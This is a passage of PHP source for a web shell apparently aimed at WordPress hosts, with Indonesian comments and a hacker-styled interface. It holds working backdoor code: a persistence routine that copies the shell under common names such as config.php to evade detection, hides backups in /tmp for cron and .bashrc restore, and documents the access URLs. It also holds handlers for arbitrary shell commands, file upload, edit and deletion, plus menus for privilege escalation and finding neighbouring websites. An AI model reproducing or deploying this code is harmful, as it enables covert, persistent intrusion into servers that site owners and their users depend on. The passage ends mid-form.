        'how_to_use' => 'Saat user login via SSH, shell akan direstore jika terhapus'
    ];
    
    // Web alias - common PHP filenames
    $web_alias_names = ['config.php', 'settings.php', 'init.php'];
    $web_aliases = [];
    $alias_urls = [];
    
    foreach ($web_alias_names as $alias_name) {
        $alias_path = $shell_dir . '/' . $alias_name;
        if (!file_exists($alias_path) && @copy($shell_path, $alias_path)) {
            $web_aliases[] = $alias_path;
            $alias_urls[] = "$protocol://$host$base_path/$alias_name?masuk=al";
        }
    }
    
    $results['web_alias'] = [
        'status' => count($web_aliases) > 0 ? 'installed' : 'partial',
        'paths' => $web_aliases,
        'description' => 'Duplicate shell dengan nama umum PHP',
        'how_to_use' => 'Duplikat shell dengan nama file PHP umum untuk evasi deteksi',
        'access_urls' => $alias_urls
    ];
    
    // Build documentation for all access methods
    $all_urls = array_merge($access_urls, $alias_urls);
    $all_urls[] = "$protocol://$host$base_path/$shell_filename?masuk=al"; // Original
    
    $doc_content = "PERSISTENCE ACCESS DOCUMENTATION\n";
    $doc_content .= "================================\n\n";
    $doc_content .= "Tanggal Install: " . date('Y-m-d H:i:s') . "\n";
    $doc_content .= "Server: $host\n";
    $doc_content .= "Shell Original: $shell_path\n\n";
    $doc_content .= "=== WEB BACKUPS (Akses via Browser) ===\n";
    $doc_content .= "Lokasi: $shell_dir/\n";
    foreach ($access_urls as $i => $url) {
        $doc_content .= ($i + 1) . ". $url\n";
    }
    $doc_content .= "\n=== SYSTEM BACKUPS (Untuk Cron Recovery) ===\n";
    $doc_content .= "Backup ini tidak bisa diakses via browser, hanya untuk cron restore.\n";
    foreach ($system_backups as $backup) {
        $doc_content .= "- {$backup['path']}\n";
    }
    $doc_content .= "\n=== CARA RESTORE ===\n";
    $doc_content .= "1. Cron: Otomatis setiap menit dari system backup\n";
    $doc_content .= "2. Manual: cp /tmp/.sysconfig/config.php $shell_path\n";
    $doc_content .= "3. Bashrc: Auto-restore saat login SSH\n";
    $doc_content .= "\n=== PERBEDAAN ===\n";
    $doc_content .= "- Web Backups: Di folder shell (/wp-content/languages/), bisa diakses browser\n";
    $doc_content .= "- System Backups: Di /tmp/, /var/tmp/, hanya untuk cron restore\n";
    
    $doc_path = $shell_dir . '/.persistence_doc.txt';
    @file_put_contents($doc_path, $doc_content);
    
    return [
        'success' => true,
        'methods' => $results,
        'all_urls' => $all_urls,
        'system_backups' => $system_backups,
        'documentation_file' => $doc_path,
        'documentation_content' => $doc_content,
        'ssh_documentation' => $ssh_doc,
        'warning' => 'WEB BACKUPS di ' . $shell_dir . ' (' . count($hidden_paths) . ' files) - SYSTEM BACKUPS di /tmp/, /var/tmp/ (' . count($system_backups) . ' files). Jika folder shell dihapus, cron tetap bisa restore dari system backups!'
    ];
}

// Shell command handler - execute command and capture output
if (!empty($_POST['cmd'])) {
    $cmd_dir = $_POST['d'] ?? $dir ?? getcwd();
    chdir($cmd_dir);
    $cmd = $_POST['cmd'];
    // Security: basic command validation
    if (strlen($cmd) > 0 && strlen($cmd) < 10000) {
        $output = execute_shell_command($cmd);
    } else {
        $output = "Error: Invalid command length";
    }
}
if (isset($_POST['new_name']) && $renameTarget) {
    $oldPath = $dir . DIRECTORY_SEPARATOR . $renameTarget;
    $newPath = $dir . DIRECTORY_SEPARATOR . basename($_POST['new_name']);
    if (@rename($oldPath, $newPath)) {
        header("Location: ?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($dir));
        exit;
    } else {
        $output = "Failed to rename $renameTarget.";
    }
}
if (isset($_POST['save_edit']) && isset($_POST['edit_file']) && isset($_POST['file_content'])) {
    $targetFile = $dir . DIRECTORY_SEPARATOR . $_POST['edit_file'];
    file_put_contents($targetFile, $_POST['file_content']);
    header("Location: ?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($dir));
    exit;
}
if (isset($_FILES['upload_file'])) {
    $uploadedCount = 0;
    $failedCount = 0;
    $fileCount = count($_FILES['upload_file']['name']);
    
    for ($i = 0; $i < $fileCount; $i++) {
        if ($_FILES['upload_file']['error'][$i] === UPLOAD_ERR_OK) {
            $target = $dir . DIRECTORY_SEPARATOR . basename($_FILES['upload_file']['name'][$i]);
            if (move_uploaded_file($_FILES['upload_file']['tmp_name'][$i], $target)) {
                $uploadedCount++;
            } else {
                $failedCount++;
            }
        } else {
            $failedCount++;
        }
    }
    
    if ($uploadedCount > 0 && $failedCount === 0) {
        $output = "✅ Upload successful: $uploadedCount file(s) uploaded.";
    } elseif ($uploadedCount > 0 && $failedCount > 0) {
        $output = "⚠️ Partial success: $uploadedCount uploaded, $failedCount failed.";
    } else {
        $output = "❌ Upload failed for all files.";
    }
}
if (isset($_POST['create_type'], $_POST['create_name'])) {
    $newPath = $dir . DIRECTORY_SEPARATOR . basename($_POST['create_name']);
    if ($_POST['create_type'] === 'file') {
        file_put_contents($newPath, '');
        $output = "File created.";
    } elseif ($_POST['create_type'] === 'dir') {
        mkdir($newPath);
        $output = "Directory created.";
    }
}
if (isset($_GET['download'])) {
    $file = basename($_GET['download']);
    $filepath = $dir . DIRECTORY_SEPARATOR . $file;
    if (is_file($filepath)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename=' . basename($filepath));
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($filepath));
        readfile($filepath);
        exit;
    }
}
if (isset($_POST['delete_target'])) {
    $target = $dir . DIRECTORY_SEPARATOR . $_POST['delete_target'];
    if (is_dir($target)) {
        $files = array_diff(scandir($target), ['.', '..']);
        foreach ($files as $file) {
            (is_dir("$target/$file")) ? rmdir_recursive("$target/$file") : unlink("$target/$file");
        }
        rmdir($target);
    } else {
        unlink($target);
    }
    header("Location: ?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($dir));
    exit;
}
function rmdir_recursive($dir) {
    $files = array_diff(scandir($dir), ['.', '..']);
    foreach ($files as $file) {
        (is_dir("$dir/$file")) ? rmdir_recursive("$dir/$file") : unlink("$dir/$file");
    }
    return rmdir($dir);
}
function list_dir($path) {
    $files = @scandir($path);
    if (!$files) return '<div class="error">Cannot open directory</div>';
    
    $html = "<div class='file-actions'><button id='zipSelectedBtn' disabled>Zip Selected</button> <button id='chmodSelectedBtn' disabled style='background: #ff9800; color: #111;'>Chmod Bulk</button> <button id='deleteSelectedBtn' disabled style='background: #d32f2f; color: white;'>Delete Selected</button></div>";
    $html .= "<table class='file-table' data-sort-col='2' data-sort-dir='asc'><thead><tr>";
    $html .= "<th><input type='checkbox' id='selectAll'></th>";
    $html .= "<th></th>";
    $html .= "<th class='sortable sort-asc' onclick='sortTable(2)'>Name <span class='sort-indicator'>↑</span></th>";
    $html .= "<th class='sortable' onclick='sortTable(3)'>Permissions <span class='sort-indicator'></span></th>";
    $html .= "<th class='sortable' onclick='sortTable(4)'>Size <span class='sort-indicator'></span></th>";
    $html .= "<th class='sortable' onclick='sortTable(5)'>Modified <span class='sort-indicator'></span></th>";
    $html .= "<th>Actions</th>";
    $html .= "</tr></thead><tbody>";
    
    if (realpath($path) !== '/') {
        $parent = dirname($path);
        $html .= "<tr><td></td><td></td><td colspan='5'><a href='?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($parent) . "'>[..]</a></td></tr>";
    }
    
    // Pisahkan direktori dan file, lalu sort berdasarkan nama A-Z
    $dirs = [];
    $files_list = [];
    
    foreach ($files as $f) {
        if ($f === "." || $f === "..") continue;
        $full = $path . DIRECTORY_SEPARATOR . $f;
        if (is_dir($full)) {
            $dirs[] = $f;
        } else {
            $files_list[] = $f;
        }
    }
    
    // Sort A-Z (case-insensitive)
    natcasesort($dirs);
    natcasesort($files_list);
    
    // Render direktori dulu, kemudian file
    foreach (array_merge($dirs, $files_list) as $f) {
        $full = $path . DIRECTORY_SEPARATOR . $f;
        $encoded = htmlspecialchars($f, ENT_QUOTES);
        $urlBase = "?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($path);
        $isDir = is_dir($full);
        $icon = $isDir ? "📁" : "📄";
        $perms = substr(sprintf('%o', fileperms($full)), -4);
        $modTime = date('d-m-Y H:i:s', filemtime($full));
        $isZip = !$isDir && pathinfo($f, PATHINFO_EXTENSION) === 'zip';
        $isWritable = is_writable($full);
        $writableClass = $isWritable ? '' : 'not-writable';
        
        // Tambahkan class not-writable juga pada link nama file/folder
        $linkClass = $isDir ? 'dir-link' : 'file-link';
        if (!$isWritable) {
            $linkClass .= ' not-writable-text';
        }
        $nameLink = $isDir 
            ? "<a class='$linkClass' href='$urlBase&d=" . urlencode($full) . "'>$encoded</a>" 
            : "<a class='$linkClass' href='$urlBase&d=" . urlencode($full) . "'>$encoded</a>";
        
        if ($isDir) {
            $size = '-';
        } else {
            $sizeInBytes = filesize($full);
            $size = number_format($sizeInBytes / 1048576, 2) . ' MB';
        }
        
        $checkbox = "<input type='checkbox' class='file-select' value='" . htmlspecialchars($f, ENT_QUOTES) . "'>";
        $actions = "<a class='action-link' href='javascript:void(0)' onclick='viewFileAsync(\"" . htmlspecialchars($f, ENT_QUOTES) . "\")'>[V]</a>
                   <a class='action-link' href='javascript:void(0)' onclick='openEditModal(\"" . htmlspecialchars($f, ENT_QUOTES) . "\")'>[E]</a>
                   <a class='action-link' href='javascript:void(0)' onclick='openRenameModal(\"" . htmlspecialchars($f, ENT_QUOTES) . "\")'>[R]</a>
                   <a class='action-link' href='javascript:void(0)' onclick='openChmodModal(\"" . htmlspecialchars($f, ENT_QUOTES) . "\")'>[Chmod]</a>
                   <a class='action-link' href='javascript:void(0)' onclick='openDeleteModal(\"" . htmlspecialchars($f, ENT_QUOTES) . "\")'>[Del]</a>
                   <a class='action-link' href='$urlBase&download=" . urlencode($f) . "' target='_blank'>[DL]</a>";
        if ($isZip) {
            $actions .= " <a class='action-link' href='javascript:void(0)' onclick='unzipFile(\"" . htmlspecialchars($f, ENT_QUOTES) . "\")'>[U]</a>";
        }
        $html .= "<tr data-filename='" . htmlspecialchars($f, ENT_QUOTES) . "'>";
        $html .= "<td>$checkbox</td>";
        $html .= "<td class='$writableClass'>$icon</td>";
        $html .= "<td>$nameLink</td>";
        $html .= "<td>$perms</td>";
        $html .= "<td>$size</td>";
        $html .= "<td>$modTime</td>";
        $html .= "<td>$actions</td>";
        $html .= "</tr>";
    }
    $html .= "</tbody></table>";
    return $html;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>::S Y A L O M::</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: 'Courier New', Courier, monospace; background: #111; color: #0f0; margin: 0; padding: 10px; }
        .container { display: flex; max-width: 1600px; margin: auto; gap: 20px; }
        .menu-panel { width: 30%; min-width: 300px; }
        .file-panel { width: 70%; }
        h1, h2, h3 { color: #0f0; border-bottom: 1px solid #0f0; padding-bottom: 5px; }
        input, textarea, select { width: 100%; margin-bottom: 10px; background: #222; color: #0f0; border: 1px solid #0f0; padding: 8px; box-sizing: border-box; }
        input[type="checkbox"], input[type="radio"] { width: auto; vertical-align: middle; margin-right: 8px; }
        button { padding: 8px 12px; background: #0f0; color: #111; border: none; cursor: pointer; font-weight: bold; margin-right: 5px;}
        button:disabled { background: #444; color: #666; cursor: not-allowed; }
        .output { white-space: pre-wrap; background: #000; padding: 10px; border: 1px solid #0f0; margin-top: 10px; word-wrap: break-word; }
        .section { margin-bottom: 8px; border: 1px solid #0f0; padding: 10px; max-height: 400px; overflow-y: auto; }
        .section pre { font-size: 11px; line-height: 1.3; }
        .section h3 { margin: 0 0 8px 0; font-size: 13px; padding-bottom: 5px; }
        .section form { margin: 0; }
        .section input, .section select, .section button { margin-bottom: 6px; padding: 5px; }
        .section p { margin: 0 0 5px 0; }
        /* Compact menu styles */
        .menu-panel h1 { margin: 0 0 10px 0; font-size: 18px; padding-bottom: 8px; }
        .menu-compact { display: flex; flex-wrap: wrap; gap: 5px; }
        .menu-compact button { flex: 1; min-width: 120px; font-size: 11px; padding: 6px; margin: 0; }
        .info-group { margin-bottom: 15px; }
        .info-group strong { color: #6cf; cursor: help; }
        .action-link { color: #fff; }
        a { color: #f0f; text-decoration: none; }
        .file-link { color: #0f0; }
        .dir-link { color: #f0f; }
        #server-info { background: #000; border: 1px solid #0f0; padding: 10px; margin-bottom: 10px; white-space: pre-wrap; }
        #breadcrumbs { background: #1a1a1a; padding: 10px; margin-bottom: 10px; border: 1px solid #0f0; }
        #breadcrumbs a { color: #6cf; text-decoration: none; }
        #breadcrumbs a:hover { text-decoration: underline; }
        .modal { display: none; position: fixed; z-index: 10; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.8); justify-content: center; align-items: center; }
        .modal-content { background: #222; color: #0f0; padding: 20px; border: 2px solid #0f0; width: 90%; max-width: 700px; max-height: 80vh; overflow-y: auto; position: relative; }
        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
        .modal-header h3 { margin: 0; border: none; }
        .modal-body { max-height: 60vh; overflow-y: auto; }
        .modal-footer { margin-top: 15px; text-align: right; }
        #viewContent, #shellOutput, #serverInfoContent, #searchResultsContent { background: #111; padding: 10px; border: 1px solid #0f0; max-height: 400px; overflow: auto; white-space: pre-wrap; word-wrap: break-word; }
        .modal textarea { width: 100%; height: 300px; }
        .modal.active { display: flex; }
        .shell-shortcuts { margin-top: 0; flex: 1; overflow: hidden; display: flex; flex-direction: column; }
        .shell-shortcuts strong { color: #6cf; display: block; margin-bottom: 10px; font-size: 13px; border-bottom: 1px solid #333; padding-bottom: 8px; }
        .shortcut-list { max-height: none; overflow-y: auto; padding-right: 5px; flex: 1; }
        .shortcut-item { cursor: pointer; padding: 10px; margin: 4px 0; border: 1px solid #333; border-radius: 4px; display: flex; flex-direction: column; transition: all 0.2s; background: #1a1a1a; }
        .shortcut-item:hover { background-color: #252525; border-color: #0f0; }
        .shell-left .shortcut-item code { background: #0f0; color: #000; padding: 4px 10px; border-radius: 3px; font-family: 'Courier New', monospace; font-size: 11px; font-weight: bold; border: 1px solid #0f0; margin-bottom: 6px; display: inline-block; align-self: flex-start; }
        .shell-left .shortcut-desc { color: #aaa; font-size: 10px; margin-left: 0; line-height: 1.4; }
        .shell-left .shortcut-desc strong { color: #ff0; font-size: 10px; border: none; padding: 0; display: inline; margin: 0; }
        .db-sidebar .shortcut-item { flex-direction: row; }
        .db-sidebar .shortcut-item code { background: #1a1a1a; color: #0f0; padding: 4px 10px; border-radius: 3px; font-family: 'Courier New', monospace; font-size: 12px; font-weight: bold; min-width: 140px; display: inline-block; border: 1px solid #0f0; }
        .db-sidebar .shortcut-desc { color: #888; font-size: 11px; margin-left: 12px; }
        .shortcut-item:hover .shortcut-desc { color: #ddd; }
        .shortcut-divider { border-top: 2px solid #0f0; margin: 15px 0; }
        .shortcut-list::-webkit-scrollbar, #shellOutput::-webkit-scrollbar, .discover-content::-webkit-scrollbar { width: 8px; height: 8px; }
        .shortcut-list::-webkit-scrollbar-track, #shellOutput::-webkit-scrollbar-track, .discover-content::-webkit-scrollbar-track { background: #111; }
        .shortcut-list::-webkit-scrollbar-thumb, #shellOutput::-webkit-scrollbar-thumb, .discover-content::-webkit-scrollbar-thumb { background: #0f0; border-radius: 4px; }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
        .file-actions { margin-bottom: 10px; }
        .file-table { width: 100%; border-collapse: collapse; }
        .file-table th, .file-table td { border: 1px solid #0f0; padding: 8px; text-align: left; }
        .file-table th { background-color: #222; cursor: pointer; user-select: none; }
        .file-table th:hover { background-color: #333; }
        .file-table tbody tr:nth-child(even) { background-color: #1a1a1a; }
        .file-table tbody tr:hover { background-color: #2a2a2a; }
        .not-writable { color: #f44; }
        .not-writable-text { color: #f44 !important; }
        .not-writable-text:hover { color: #ff6666 !important; }
        /* Sortable column styles */
        .file-table th.sortable { cursor: pointer; user-select: none; }
        .file-table th.sortable:hover { background-color: #333; }
        .file-table th.sort-asc .sort-indicator, .file-table th.sort-desc .sort-indicator { color: #0f0; font-weight: bold; }
        .file-table th .sort-indicator { color: #666; margin-left: 5px; }
        /* 🔥 Privilege Escalation Styles */
        /* Compact Privesc Styles */
        .privesc-output { background: #000; border: 1px solid #333; padding: 8px; font-family: monospace; font-size: 11px; white-space: pre-wrap; max-height: 150px; overflow-y: auto; border-radius: 4px; }
        .chmod-options { display: flex; align-items: center; gap: 15px; margin-bottom: 10px; }
        .chmod-options label { white-space: nowrap; }
        .navigation-container { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
        .navigation-form { display: flex; gap: 10px; }
        .navigation-form input { width: 300px; }
        .navigation-form button { white-space: nowrap; }
        .default-dir-btn { background: #6cf; color: #111; }
        .modal-content { max-width: 90vw !important; width: 90vw !important; }
        .modal-wide { max-height: 85vh !important; display: flex; flex-direction: column; }
        .shell-container { display: flex; gap: 0; flex: 1; overflow: hidden; min-height: 500px; }
        .shell-left { width: 380px; min-width: 380px; border-right: 1px solid #0f0; padding: 15px; overflow-y: auto; background: #1a1a1a; display: flex; flex-direction: column; }
        .shell-left form { display: flex; gap: 8px; margin-bottom: 15px; }
        .shell-left input { flex: 1; margin-bottom: 0; }
        .shell-left button { margin: 0; white-space: nowrap; }
        .shell-right { flex: 1; display: flex; flex-direction: column; overflow: hidden; padding: 15px; background: #111; }
        .shell-output-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; padding-bottom: 10px; border-bottom: 1px solid #333; }
        .shell-output-header strong { color: #6cf; }
        #shellOutput { flex: 1; overflow: auto; background: #000; border: 1px solid #0f0; padding: 15px; margin: 0; font-size: 12px; line-height: 1.5; }
        .modal-discover { width: 95vw !important; height: 95vh !important; max-width: 95vw !important; max-height: 95vh !important; display: flex; flex-direction: column; }
        .discover-container { display: flex; gap: 0; flex: 1; overflow: hidden; padding: 0 !important; }
        .discover-sidebar { width: 300px; min-width: 300px; border-right: 1px solid #0f0; padding: 20px; overflow-y: auto; background: #1a1a1a; }
        .discover-main { flex: 1; overflow: hidden; display: flex; flex-direction: column; background: #111; }
        .discover-content { flex: 1; overflow-y: auto; padding: 20px; }
        .discover-placeholder { text-align: center; padding: 50px 20px; }
        .search-type-selector { display: flex; gap: 8px; }
        .search-type { flex: 1; border: 1px solid #333; border-radius: 6px; padding: 10px; cursor: pointer; transition: all 0.2s; background: #222; font-size: 11px; text-align: center; }
        .search-type:hover { border-color: #6cf; background: #2a2a2a; }
        .search-type.active { border-color: #6cf; background: #6cf; color: #111; font-weight: bold; }
        .scan-modes { display: flex; flex-direction: column; gap: 8px; }
        .scan-mode { border: 1px solid #333; border-radius: 6px; padding: 10px; cursor: pointer; transition: all 0.2s; background: #222; }
        .scan-mode:hover { border-color: #0f0; background: #2a2a2a; }
        .scan-mode.active { border-color: #0f0; background: #0f0; color: #111; }
        .scan-mode.active .scan-desc { color: #333; }
        .scan-mode strong { display: block; font-size: 12px; margin-bottom: 3px; }
        .scan-desc { font-size: 9px; color: #888; line-height: 1.3; }
        .website-item { border: 1px solid #0f0; margin: 10px 0; padding: 15px; background: #1a1a1a; border-radius: 6px; transition: all 0.2s; }
        .website-item:hover { background: #222; border-color: #6cf; }
        .website-item.priority { border-width: 2px; border-color: #ff0; background: #2a2a00; }
        .website-item.priority:hover { background: #333300; }
        .website-title { color: #ff0; font-size: 14px; font-weight: bold; margin-bottom: 5px; }
        .website-path { background: #000; padding: 8px; border-radius: 3px; font-family: monospace; font-size: 11px; color: #0f0; word-break: break-all; margin: 8px 0; }
        .website-meta { font-size: 11px; color: #888; margin-top: 8px; }
        .website-meta span { margin-right: 15px; }
        .website-badge { display: inline-block; padding: 2px 8px; border-radius: 3px; font-size: 10px; margin-left: 8px; }
        .badge-writable { background: #f44; color: #fff; }
        .badge-readonly { background: #666; color: #fff; }
        .badge-title { background: #ff0; color: #000; font-weight: bold; }
        .drop-zone { border: 2px dashed #0f0; border-radius: 6px; padding: 15px; text-align: center; background: #1a1a1a; transition: all 0.3s; cursor: pointer; min-height: 120px; display: flex; flex-direction: column; justify-content: center; }
        .drop-zone:hover { background: #222; border-color: #6cf; }
        .drop-zone.drag-over { background: #0f0; border-color: #fff; }
        .drop-zone.drag-over .drop-icon, .drop-zone.drag-over .drop-text, .drop-zone.drag-over .drop-or { color: #000; }
        .drop-zone-content { pointer-events: none; }
        .drop-icon { font-size: 40px; display: block; margin-bottom: 10px; }
        .drop-text { color: #0f0; font-size: 14px; margin: 5px 0; }
        .drop-or { color: #666; font-size: 12px; margin: 5px 0; }
        .drop-button { display: inline-block; padding: 8px 20px; background: #0f0; color: #111; border-radius: 4px; cursor: pointer; font-weight: bold; font-size: 12px; pointer-events: auto; }
        .drop-button:hover { background: #6cf; }
        .drop-file-list { margin-top: 15px; text-align: left; max-height: 200px; overflow-y: auto; }
        .drop-file-item { background: #222; border: 1px solid #0f0; padding: 8px 12px; border-radius: 4px; margin: 5px 0; display: flex; justify-content: space-between; align-items: center; }
        .drop-file-name { color: #0f0; font-size: 12px; word-break: break-all; }
        .drop-file-size { color: #888; font-size: 11px; margin-left: 10px; }
        .drop-file-remove { color: #f44; cursor: pointer; font-size: 16px; padding: 0 5px; }
        .drop-file-remove:hover { color: #f88; }
        .modal-fullscreen { max-width: 95vw !important; width: 95vw !important; height: 90vh !important; }
        .db-manager-body { display: flex; gap: 0; padding: 0 !important; height: calc(90vh - 120px); }
        .db-sidebar { width: 250px; min-width: 250px; border-right: 1px solid #0f0; padding: 15px; overflow-y: auto; background: #1a1a1a; }
        .db-sidebar ul { list-style: none; padding: 0; margin: 0; }
        .db-sidebar li { padding: 8px 10px; margin: 2px 0; cursor: pointer; border-radius: 4px; font-size: 12px; font-family: monospace; color: #0f0; }
        .db-sidebar li:hover { background: #252525; }
        .db-main-content { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
        .db-query-section { padding: 15px; border-bottom: 1px solid #333; background: #1a1a1a; }
        .db-query-input { display: flex; gap: 10px; }
        .db-query-input textarea { flex: 1; height: 80px; margin-bottom: 0; resize: none; }
        .db-query-buttons { display: flex; flex-direction: column; gap: 5px; }
        .db-result-section { flex: 1; overflow: auto; padding: 15px; }
        .db-result-section table th { background: #222; padding: 10px; text-align: left; border-bottom: 2px solid #0f0; color: #6cf; }
        .db-result-section table td { padding: 8px 10px; border-bottom: 1px solid #333; font-size: 12px; max-width: 300px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
        .db-result-section table tr:hover td { background: #1a1a1a; }
    </style>
</head>
<body>
<div class="container">
    <div class="menu-panel">
        <h1>::S Y A L O M::</h1>
        <!-- Quick Actions Row -->
        <div class="section">
            <h3>⚡ Quick Actions</h3>
            <div class="menu-compact">
                <button onclick="loadAndShowServerInfo()">🖥️ Server Info</button>
                <button onclick="openModal('shellModal')">💻 Shell</button>
            </div>
        </div>
        <!-- Search Section - Compact -->
        <div class="section">
            <h3>🔍 Search</h3>
            <form id="searchForm">
                <input type="text" name="search_term" id="searchTermInput" placeholder="Enter search term..." style="margin-bottom: 4px;">
                <div style="margin-bottom: 4px; font-size: 11px;">
                    <label style="margin-right: 8px;"><input type="radio" name="search_type" value="filename" checked> File</label>
                    <label><input type="radio" name="search_type" value="content"> Content</label>
                </div>
                <div style="margin-bottom: 4px; font-size: 11px;">
                    <label><input type="checkbox" name="search_root" id="searchRootCheckbox"> From root (/)</label>
                </div>
                <button type="submit" style="width: 100%;">🔍 Search</button>
            </form>
        </div>
        <!-- Upload Section - Compact -->
        <div class="section">
            <h3>📤 Upload</h3>
            <form method="post" enctype="multipart/form-data" id="uploadForm">
                <div id="dropZone" class="drop-zone" style="min-height: 80px; padding: 10px;">
                    <div class="drop-zone-content">
                        <span class="drop-icon" style="font-size: 24px; margin-bottom: 5px;">📁</span>
                        <p class="drop-text" style="font-size: 12px; margin: 2px 0;">Drop files here</p>
                        <label for="uploadFileInput" class="drop-button" style="padding: 4px 12px; font-size: 11px;">Browse</label>
                        <input type="file" name="upload_file[]" id="uploadFileInput" style="display: none;" multiple>
                    </div>
                    <div class="drop-file-list" id="dropFileList"></div>
                </div>
                <button type="submit" id="uploadSubmitBtn" style="margin-top: 6px; width: 100%; padding: 6px; font-size: 11px;" disabled>📤 Upload <span id="fileCount">0</span></button>
            </form>
        </div>
        <!-- Create Section - Compact -->
        <div class="section">
            <h3>➕ Create</h3>
            <form method="post" style="display: flex; gap: 5px;">
                <input type="text" name="create_name" placeholder="Name" style="flex: 1; margin-bottom: 0;">
                <select name="create_type" style="width: 80px; margin-bottom: 0;">
                    <option value="file">File</option>
                    <option value="dir">Dir</option>
                </select>
                <button type="submit" style="margin-bottom: 0; padding: 5px 10px;">➕</button>
            </form>
        </div>
        <!-- Database Section - Compact -->
        <div class="section">
            <h3>🗄️ Database</h3>
            <div class="menu-compact">
                <button onclick="exploreDatabase()">🔍 Explore WP</button>
                <button onclick="openModal('dbConnectModal')">🔌 Connect</button>
            </div>
        </div>
        <!-- Privesc Section - Compact -->
        <div class="section">
            <h3>💀 Privilege Escalation</h3>
            <button onclick="openModal('privescModal')" style="background:linear-gradient(135deg,#f44,#f80);color:#fff;font-weight:bold;width:100%; padding: 8px; font-size: 12px;">💀 OPEN PRIVESC</button>
        </div>
        <!-- Website Finder Section - Compact -->
        <div class="section">
            <h3>🌐 Website Finder</h3>
            <button onclick="discoverWebsites()" style="width: 100%;">🔍 Find Websites</button>
        </div>
    </div>
    <div class="file-panel">
        <?php
        // Detect available shell execution methods
        $available_methods = [];
        $disabled_funcs = explode(',', ini_get('disable_functions'));
        if (function_exists('shell_exec') && !in_array('shell_exec', $disabled_funcs)) $available_methods[] = 'shell_exec';
        if (function_exists('exec') && !in_array('exec', $disabled_funcs)) $available_methods[] = 'exec';
        if (function_exists('system') && !in_array('system', $disabled_funcs)) $available_methods[] = 'system';
        if (function_exists('passthru') && !in_array('passthru', $disabled_funcs)) $available_methods[] = 'passthru';
        if (function_exists('proc_open') && !in_array('proc_open', $disabled_funcs)) $available_methods[] = 'proc_open';
        if (function_exists('popen') && !in_array('popen', $disabled_funcs)) $available_methods[] = 'popen';
        $exec_status = count($available_methods) > 0 ? '🟢 Shell: ' . implode(', ', $available_methods) : '🔴 Shell: Disabled';
        ?>
        <div id="server-info"><strong>Server Info:</strong><br><?php echo htmlspecialchars($server_info) ?><br><strong>SOFT:</strong> <?php echo htmlspecialchars($software_info) ?> <strong>PHP:</strong> <?php echo htmlspecialchars($php_version) ?><br><strong>Path:</strong> <?php echo htmlspecialchars($dir) ?><br><strong>IP:</strong> <?php echo htmlspecialchars($server_ip) ?><br><?php echo $exec_status; ?></div>
        <div class="navigation-container">
            <div id="breadcrumbs"><?php echo generate_breadcrumbs($dir) ?></div>
            <div class="navigation-form">
                <form method="post" id="navigateForm" style="display: flex; gap: 10px;">
                    <input type="hidden" name="action" value="navigate_to_dir">
                    <input type="text" name="target_dir" id="targetDirInput" placeholder="/path/to/directory" value="<?php echo htmlspecialchars($dir) ?>">
                    <button type="submit">Go</button>
                </form>
                <button class="default-dir-btn" onclick="goToDefaultDirectory()">Default</button>
            </div>
        </div>
        <?php echo list_dir($dir) ?>
    </div>
</div>
<div class="output" style="display:none;"><?php echo htmlspecialchars($output) ?></div>
<div class="modal" id="viewModal">
    <div class="modal-content">
        <div class="modal-header">
            <h3 id="viewTitle"></h3>
            <button onclick="copyToClipboard('viewContent')">📋 Copy</button>
        </div>
        <div class="modal-body">
            <pre id="viewContent">⏳ Loading...</pre>
        </div>
        <div class="modal-footer">
            <button onclick="closeModal('viewModal')">Close</button>
        </div>
    </div>
</div>
<div class="modal" id="editModal">
    <div class="modal-content">
        <div class="modal-header">
            <h3 id="editTitle"></h3>
        </div>
        <form method="post">
            <input type="hidden" name="edit_file" id="editFile">
            <textarea name="file_content" id="editContent"></textarea>
            <div class="modal-footer">
                <button type="submit" name="save_edit">Save</button>
                <button type="button" onclick="closeModal('editModal')">Cancel</button>
            </div>
        </form>
    </div>
</div>
<div class="modal" id="renameModal">
    <div class="modal-content">
        <div class="modal-header">
            <h3 id="renameTitle"></h3>
        </div>
        <form method="post">
            <input type="hidden" name="rename_target" id="renameTarget">
            <input type="text" name="new_name" placeholder="New name">
            <div class="modal-footer">
                <button type="submit">Rename</button>
                <button type="button" onclick="closeModal('renameModal')">Cancel</button>
            </div>
        </form>
    </div>
</div>
<div class="modal" id="chmodModal">
    <div class="modal-content">
        <div class="modal-header">
            <h3 id="chmodTitle"></h3>
        </div>
        <form id="chmodForm" method="post">
            <input type="hidden" name="action" value="chmod">
            <input type="hidden" name="chmod_target" id="chmodTarget">
            <div class="chmod-options">
                <label for="chmodPermSelect">Permissions:</label>
                <select name="chmod_perm" id="chmodPermSelect">
                    <option value="755">755 (rwxr-xr-x)</option>
                    <option value="644">644 (rw-r-r-)</option>
                    <option value="777">777 (rwxrwxrwx)</option>
                    <option value="600">600 (rw----)</option>
                    <option value="750">750 (rwxr-x--)</option>
                    <option value="custom">Custom...</option>
                </select>
            </div>
            <div id="customPermDiv" style="display:none; margin-bottom: 10px;">
                <label for="customPermInput">Custom Value (e.g., 755 or u+rwx):</label>
                <input type="text" name="custom_perm" id="customPermInput" placeholder="755">
            </div>
            <div class="chmod-options">
                <input type="checkbox" name="chmod_recursive" id="chmodRecursive">
                <label for="chmodRecursive">Recursive (apply to contents of directory)</label>
            </div>
            <div class="modal-footer">
                <button type="submit">Apply</button>
                <button type="button" onclick="closeModal('chmodModal')">Cancel</button>
            </div>
        </form>
    </div>
</div>
<div class="modal" id="confirmDeleteModal">
    <div class="modal-content">
        <div class="modal-header">
            <h3>Confirm Delete</h3>
        </div>
        <p id="deleteMessage"></p>
        <form method="post">
